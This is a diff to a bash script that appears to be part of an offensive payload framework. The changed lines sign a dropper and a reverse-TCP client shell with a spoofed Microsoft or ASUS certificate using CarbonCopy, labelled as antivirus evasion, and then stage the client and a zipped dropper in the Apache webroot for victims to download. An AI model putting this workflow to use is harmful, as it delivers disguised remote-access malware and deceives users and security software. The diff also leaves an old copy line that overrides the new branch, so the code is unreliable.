@@ -13028,8 +13028,9 @@ if [ "$easter_egg" = "ON" ]; then
    echo "${BlueF}[☠]${white} Sign Executable for AV Evasion (CarbonCopy) .."${Reset};sleep 2
    conv=$(cat /dev/urandom | tr -dc '1-6' | fold -w 1 | head -n 1)
    if [ "$conv" "<" "3" ]; then SSL_domain="www.microsoft.com"; else SSL_domain="www.asus.com";fi
-   echo "${BlueF}[${YellowF}i${BlueF}]${white} spoofed certificate:${BlueF}$SSL_domain"${Reset};sleep 2
+   echo "${BlueF}[${YellowF}i${BlueF}]${white} spoofed certificate:${YellowF} $SSL_domain"${Reset};sleep 2
    cd $IPATH/obfuscate
+   cp $IPATH/bin/Client.exe $IPATH/output/Client.exe
    xterm -T "CarbonCopy - Signs an Executable for AV Evasion" -geometry 110x23 -e "python3 CarbonCopy.py $SSL_domain 443 $IPATH/output/$Drop.exe $IPATH/output/signed-$Drop.exe && sleep 2 && python3 CarbonCopy.py $SSL_domain 443 $IPATH/output/Client.exe $IPATH/output/signed-Client.exe && sleep 2"
    mv $IPATH/output/signed-Client.exe $IPATH/output/Client.exe
    mv $IPATH/output/signed-$Drop.exe $IPATH/output/$Drop.exe
@@ -13057,6 +13058,11 @@ else
    zip $Drop.zip $Drop.exe > /dev/nul 2>&1 # ZIP dropper.exe
 fi
 echo "${BlueF}[☠]${white} Porting required files to apache2 webroot."${Reset};sleep 2
+if [ "$easter_egg" = "ON" ]; then
+   cp $IPATH/output/Client.exe $ApAcHe/Client.exe > /dev/nul 2>&1 # rev tcp Client shell
+else
+   cp $IPATH/bin/Client.exe $ApAcHe/Client.exe > /dev/nul 2>&1 # rev tcp Client shell
+fi
 cp $IPATH/bin/Client.exe $ApAcHe/Client.exe > /dev/nul 2>&1 # rev tcp Client shell
 cp $IPATH/bin/Server.exe $IPATH/output/Server.exe > /dev/nul 2>&1 # Server
 mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # Dropper ziped
